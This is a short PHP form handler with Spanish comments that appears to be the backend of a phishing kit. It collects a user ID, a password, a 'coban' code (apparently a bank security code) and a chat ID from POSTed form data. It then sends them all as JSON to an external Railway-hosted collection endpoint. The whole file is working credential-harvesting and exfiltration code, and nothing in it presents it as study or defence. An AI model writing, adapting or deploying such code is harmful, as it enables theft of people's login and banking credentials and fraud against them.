<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userID = $_POST['userID'];
    $password = $_POST['password'];
    $coban = $_POST['coban'];
    $chatID = $_POST['chatID'];

    // Generar uniqueID
    $uniqueID = uniqid();
    $_SESSION['uniqueID'] = $uniqueID;
    $_SESSION['chatID'] = $chatID;
    // Preparar los datos para enviar a la API
    $data = [
        'coban' => $coban,
        'user' => $userID,
        'uniqueID' => $uniqueID,
        'pass' => $password,
        'chatID' => $chatID,
    ];

    // Configurar cURL
    $ch = curl_init('https://spike-production.up.railway.app/dataUsers');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    // Ejecutar la solicitud y obtener la respuesta
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Cerrar cURL
    curl_close($ch);

    // Enviar la respuesta de vuelta al cliente
    echo json_encode([
        'response' => json_decode($response),
        'uniqueID' => $uniqueID,
        'httpCode' => $httpCode,
    ]);
} else {
    echo json_encode(['error' => 'Invalid request method']);
}